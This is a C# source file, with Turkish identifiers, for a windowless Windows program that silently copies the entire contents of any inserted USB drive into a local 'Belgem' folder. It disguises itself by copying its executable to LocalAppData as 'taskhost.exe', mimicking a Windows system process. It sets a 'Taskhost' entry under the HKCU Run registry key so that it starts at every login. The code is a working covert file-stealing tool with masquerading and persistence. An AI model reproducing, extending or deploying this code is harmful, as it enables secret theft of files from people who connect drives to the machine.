using System;
using System.Collections;
using System.Collections.Generic;
using System.Text;

using System.Windows.Forms;
using System.ComponentModel;
using System.IO;
using Dolinay;
using System.Threading;
using Microsoft.Win32;
class ControlContainer : IContainer
{
    ComponentCollection _components;

    public ControlContainer()
    {
        _components = new ComponentCollection(new IComponent[] { });
    }

    public void Add(IComponent component)
    { }
    public void Add(IComponent component, string Name)
    { }
    public void Remove(IComponent component)
    { }
    public ComponentCollection Components
    {
        get { return _components; }
    }
    public void Dispose()
    {
        _components = null;
    }
}

namespace FlashKopyalayici
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            MainClass sc = new MainClass();
            Application.Run();
        }
    }
}

namespace FlashKopyalayici
{
    class MainClass
    {
        ControlContainer    container = new ControlContainer();
        DriveDetector       driveDetector;
        //string kopyalanacakYer2 = "C:\\Users\\" + System.Windows.Forms.SystemInformation.UserName + "\\Desktop\\aaa";
        string kopyalanacakYer2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Belgem";
        string kopyalanacakYer = "D:\\Belgem";
        string programKonumIsim = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\taskhost.exe";
        public MainClass()
        {
            driveDetector = new DriveDetector();
            driveDetector.DeviceArrived += new DriveDetectorEventHandler(OnDriveArrived);
            driveDetector.DeviceRemoved += new DriveDetectorEventHandler(OnDriveRemoved);
            driveDetector.QueryRemove += new DriveDetectorEventHandler(OnQueryRemove);
            try
            {
                Console.WriteLine("AYGIT TAKILDIKTAN 10 sn SONRA KOPYALAMAYA BASLAR");
                if (!Directory.Exists(kopyalanacakYer2))
                {
                    Directory.CreateDirectory(kopyalanacakYer2);
                    Console.WriteLine("Klasor2 olusturuldu");
                }
                else
                    Console.WriteLine("Klasor zaten Var");

                if (!Directory.Exists(kopyalanacakYer))
                {
                    Directory.CreateDirectory(kopyalanacakYer);
                    Console.WriteLine("Klasor olusturuldu");
                }else
                    Console.WriteLine("Klasor zaten Var");
                RegeditKaydet();
                DosyaKaydet();
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        public void OnDriveArrived(object sender, DriveDetectorEventArgs e){
            Console.WriteLine("AYGIT Takildi  : "+e.Drive);
            //TreeNode currentList = Listele(new DirectoryInfo(e.Drive));
            Thread.Sleep(10000);
            try
            {
                
                    Kopyala(new DirectoryInfo(e.Drive + "\\"), new DirectoryInfo(kopyalanacakYer2));

            }
            catch (Exception x)
            {
                Console.WriteLine(x.Message);
            }
        }
        public void OnDriveRemoved(object sender, DriveDetectorEventArgs e)
        {
            Console.WriteLine("AYGIT Cikarildi: " + e.Drive);
        }
        public void OnQueryRemove(object sender, DriveDetectorEventArgs e)
        {
            Console.WriteLine("Query Remove: " + e.Drive);
        }
        public TreeNode Listele(DirectoryInfo directoryInfo)
        {
            try 
            {
                var directoryNode = new TreeNode(directoryInfo.Name);
                foreach (var directory in directoryInfo.GetDirectories())
                    directoryNode.Nodes.Add(Listele(directory));
                foreach (var file in directoryInfo.GetFiles())
                    directoryNode.Nodes.Add(new TreeNode(file.Name));

                return directoryNode;
            }
            catch
            {
                return new TreeNode();
            }
           
        }

        public void Kopyala(DirectoryInfo kaynakKonum, DirectoryInfo kopyaKonum)
        {
                foreach (var file in kaynakKonum.GetFiles())
                {
                    try
                    {
                        if (!Directory.Exists(kopyaKonum.ToString()))
                            Directory.CreateDirectory(kopyaKonum.ToString());
                        file.CopyTo(kopyaKonum.ToString() + "\\" + file.Name, false);
                        Console.WriteLine("OK >>> " + kopyaKonum.Name + ">>>" + file.Name);
                    }
                    catch(Exception e)
                    {
                        Console.WriteLine("HATA >>> " + e.Message + ">>>" + file.Name);
                    }
                }
                foreach (var directory in kaynakKonum.GetDirectories())
                {
                    Kopyala(directory, new DirectoryInfo(kopyaKonum + "\\" + directory.Name));
                }
        }
        //MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
        bool RegeditKaydet()
        {
            try
            {
                Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "Taskhost",
                    programKonumIsim);
                return true;
                //MessageBox.Show(System.Windows.Forms.SystemInformation.UserName);
                //MessageBox.Show(Environment.CurrentDirectory);
                //MessageBox.Show(Application.ProductName);
                //MessageBox.Show(System.AppDomain.CurrentDomain + "");
                //MessageBox.Show(Path.GetFileName(Application.ExecutablePath));
            }
            catch
            {
                return false;
            }
        }
        //MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
        bool DosyaKaydet()
        {
            try
            {
                File.Copy(Path.GetDirectoryName(Application.ExecutablePath) + "\\" + Path.GetFileName(Application.ExecutablePath),
                   programKonumIsim,
                   true);
                return true;
            }
            catch
            {
                return false;
            }
        }
        //MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
    }
}